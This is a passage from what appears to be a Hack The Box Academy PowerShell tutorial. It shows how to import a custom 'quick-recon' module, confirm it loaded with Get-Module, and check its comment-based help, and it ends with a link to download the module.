<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Import-Module 'C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\M</span>odules<span class="hljs-symbol">\q</span>uick-recon.psm1`

PS C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\M</span>Tanaka<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\W</span>indowsPowerShell<span class="hljs-symbol">\M</span>odules<span class="hljs-symbol">\q</span>uick-recon&gt; get-module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
Script     0.0        quick-recon                         Get-Recon
</code></pre>
<p>Perfect. We can see that our module was imported using the <code>Import-Module</code> cmdlet, and to ensure it was loaded into our session, we ran the <code>Get-Module</code> cmdlet. It has shown us that our module <code>quick-recon</code> was imported and has the command <code>Get-Recon</code> that could be exported. We can also test the Comment-based help by trying to run <code>Get-Help</code> against our module.</p>
<p><strong>Help Validation</strong></p>
<p>PowerShell Scripting and Automation</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; get-help get-recon

NAME
    Get-Recon

SYNOPSIS


SYNTAX
    Get-Recon <span class="hljs-meta">[&lt;CommonParameters&gt;]</span>


DESCRIPTION
    This <span class="hljs-keyword">function</span> performs some simple recon tasks <span class="hljs-keyword">for</span> the user. We simply import the <span class="hljs-keyword">module</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> issue the
    'Get-Recon' command <span class="hljs-keyword">to</span> retrieve our output. Each variable <span class="hljs-keyword">and</span> line within the <span class="hljs-keyword">function</span> <span class="hljs-keyword">and</span> script are commented <span class="hljs-keyword">for</span>
    your understanding. Right now, this only works on the local host from which you run it, <span class="hljs-keyword">and</span> the output will be sent
    <span class="hljs-keyword">to</span> a file named 'recon.txt' on the Desktop <span class="hljs-keyword">of</span> the user who opened the shell. Remote Recon functions coming soon!


RELATED LINKS

REMARKS
    To see the examples, <span class="hljs-class"><span class="hljs-keyword">type</span>: "<span class="hljs-title">get</span>-<span class="hljs-title">help</span> <span class="hljs-title">Get</span>-<span class="hljs-title">Recon</span> -<span class="hljs-title">examples</span>."</span>
    For more information, <span class="hljs-class"><span class="hljs-keyword">type</span>: "<span class="hljs-title">get</span>-<span class="hljs-title">help</span> <span class="hljs-title">Get</span>-<span class="hljs-title">Recon</span> -<span class="hljs-title">detailed</span>."</span>
    For technical information, <span class="hljs-class"><span class="hljs-keyword">type</span>: "<span class="hljs-title">get</span>-<span class="hljs-title">help</span> <span class="hljs-title">Get</span>-<span class="hljs-title">Recon</span> -<span class="hljs-title">full</span>."</span>
</code></pre>
<p>Our help works as well. So we now have a fully functioning module for our use. We can use this as a basis for anything we build further and could even modify this one to encompass more reconnaissance functions in the future.</p>
<hr>
<p>This was a simple example of what can be done from an automation perspective with PowerShell, but a great way to see it built and in use. We can use module building and scripting to our advantage and simplify our processes as we go. Saving time ultimately enables us to do more as operators and spend time on other tasks that need our attention. If you would like a copy of the quick-recon module for your use, there is a copy saved in the <code>Resources</code> of this module at the top right corner of any section page.</p>
<p>here : <a href="https://academy.hackthebox.com/storage/resources/quick-recon.zip">https://academy.hackthebox.com/storage/resources/quick-recon.zip</a></p>
